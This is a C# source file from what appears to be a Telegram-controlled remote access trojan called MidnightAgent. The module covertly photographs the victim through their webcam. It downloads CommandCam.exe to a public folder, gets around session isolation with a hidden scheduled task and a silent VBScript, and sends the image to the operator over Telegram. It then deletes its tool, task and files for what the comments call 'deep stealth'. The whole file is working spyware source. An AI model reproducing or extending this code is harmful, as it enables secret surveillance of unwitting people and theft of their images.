using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class WebcamFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "cam";
        public string Description => "Capture Webcam (via CommandCam)";
        public string Usage => "/cam [1-3]";

        // Direct download link for CommandCam.exe
        private const string CommandCamUrl = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe";
        private const string ToolName = "CommandCam.exe";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                // Parse Device Index (CommandCam uses 1-based index by default? No, usually 0 or 1. Let's assume 1-based from user input)
                string devArg = "1";
                if (args.Length > 0)
                {
                    devArg = args[0];
                }

                string publicDir = @"C:\Users\Public";
                string toolPath = Path.Combine(publicDir, ToolName);
                string timestamp = DateTime.Now.ToString("HHmmss");
                string outputFile = Path.Combine(publicDir, $"cam_{timestamp}.jpg");
                
                // 1. Ensure Tool Exists
                if (!File.Exists(toolPath))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>Downloading CommandCam tool...</b>");
                    try
                    {
                        using (var client = new HttpClient())
                        {
                            // Set a realistic User-Agent just in case
                            client.DefaultRequestHeaders.Add("User-Agent", "MidnightAgent");
                            var bytes = await client.GetByteArrayAsync(CommandCamUrl);
                            File.WriteAllBytes(toolPath, bytes);
                        }
                        
                        if (!File.Exists(toolPath))
                            return FeatureResult.Fail("❌ Failed to download CommandCam.exe");
                    }
                    catch (Exception ex)
                    {
                        return FeatureResult.Fail($"❌ Download Error: {ex.Message}");
                    }
                }

                // 2. Prepare Command
                // CommandCam usage: CommandCam /filename image.jpg /devnum 1 /delay 500
                string cmdArgs = $"/filename \"{outputFile}\" /devnum {devArg} /delay 1000";

                // 3. Execute (Session 0 Bypass)
                bool isSystem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSystem)
                {
                    // Run as logged-in user via XML Scheduled Task (InteractiveToken)
                    try
                    {
                        TelegramInstance?.SendMessage("🔒 <b>Running CommandCam (Session Bypass)...</b>");

                        string taskName = "MidnightCam";
                        RunSchTasks($"/Delete /TN \"{taskName}\" /F");

                        // Get logged-in username
                        string loggedInUser = GetLoggedInUser();
                        if (string.IsNullOrEmpty(loggedInUser))
                            return FeatureResult.Fail("❌ Could not determine logged-in user for session bypass");

                        // Build a clean VBScript that properly quotes the path and args
                        string vbsPath = Path.Combine(publicDir, "cam_runner.vbs");
                        // VBS: Run "C:\path\CommandCam.exe" /filename "C:\path\cam.jpg" /devnum 1 /delay 1000
                        // Escape double-quotes inside VBS string literal by doubling them
                        string vbsCmdLine = $"\"{toolPath}\" {cmdArgs}";
                        string vbsEscaped = vbsCmdLine.Replace("\"", "\"\""); // VBS string escape
                        string vbsContent = $"CreateObject(\"WScript.Shell\").Run \"{vbsEscaped}\", 0, True";
                        File.WriteAllText(vbsPath, vbsContent);

                        // XML task with InteractiveToken so it runs in the user's desktop session
                        string xmlPath = Path.Combine(publicDir, $"cam_task_{Guid.NewGuid():N}.xml");
                        string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo><Description>Cam Capture Helper</Description></RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>//B //Nologo ""{vbsPath}""</Arguments>
    </Exec>
  </Actions>
</Task>";
                        File.WriteAllText(xmlPath, taskXml);

                        string createResult = RunSchTasks($"/Create /XML \"{xmlPath}\" /TN \"{taskName}\" /F");
                        RunSchTasks($"/Run /TN \"{taskName}\"");

                        // Wait for file (up to 20s)
                        TelegramInstance?.SendMessage("⏳ <b>Capturing...</b>");
                        for (int i = 0; i < 20; i++)
                        {
                            if (File.Exists(outputFile) && new FileInfo(outputFile).Length > 0) break;
                            await Task.Delay(1000);
                        }

                        // Cleanup
                        RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                        try { File.Delete(vbsPath); } catch { }
                        try { File.Delete(xmlPath); } catch { }
                    }
                    catch (Exception ex)
                    {
                        return FeatureResult.Fail($"Session Bypass Failed: {ex.Message}");
                    }
                }
                else
                {
                    // Run directly if not SYSTEM
                    var psi = new ProcessStartInfo
                    {
                        FileName = toolPath,
                        Arguments = cmdArgs,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden, // Extra safety
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    var p = Process.Start(psi);
                    p.WaitForExit(5000);
                }

                // 4. Cleanup & Return
                
                // Delete the tool to maintain deep stealth (clean up artifacts)
                try { if (File.Exists(toolPath)) File.Delete(toolPath); } catch { }
                
                // Delete legacy logs if they exist
                string legacyLog = Path.Combine(publicDir, "cam_debug.log");
                try { if (File.Exists(legacyLog)) File.Delete(legacyLog); } catch { }

                if (File.Exists(outputFile) && new FileInfo(outputFile).Length > 0)
                {
                    // FeatureResult.File automatically sets DeleteFileAfterSend = true
                    return FeatureResult.File(outputFile, "📸 <b>Webcam Captured</b>");
                }
                else
                {
                    return FeatureResult.Fail("❌ Capture Failed. No file produced.");
                }
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
        }

        private string GetLoggedInUser()
        {
            // Method 1: WMI via explorer.exe
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
                    {
                        foreach (System.Management.ManagementObject obj in searcher.Get())
                        {
                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                            {
                                string user = ownerInfo[0];
                                string domain = ownerInfo[1];
                                if (!string.IsNullOrEmpty(user))
                                    return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
                            }
                        }
                    }
                }
            }
            catch { }

            // Method 2: quser
            try
            {
                var p = Process.Start(new ProcessStartInfo
                {
                    FileName = "quser",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                });
                string quserOut = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                foreach (var line in quserOut.Split('\n').Skip(1))
                {
                    if (line.Contains("Active") || line.Contains("rdp-tcp"))
                    {
                        string[] parts = line.Trim().TrimStart('>').Split(
                            new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length > 0) return parts[0].TrimStart('>');
                    }
                }
            }
            catch { }

            // Method 3: Environment.UserName
            try
            {
                string envUser = Environment.UserName;
                if (!string.IsNullOrEmpty(envUser) &&
                    !envUser.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    string domain = Environment.UserDomainName;
                    return string.IsNullOrEmpty(domain) || domain == envUser
                        ? envUser
                        : $"{domain}\\{envUser}";
                }
            }
            catch { }

            return null;
        }

        private string RunSchTasks(string args)
        {
            try
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks",
                        Arguments = args,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return output;
            }
            catch (Exception ex)
            {
                return $"Exec Error: {ex.Message}";
            }
        }
    }
}
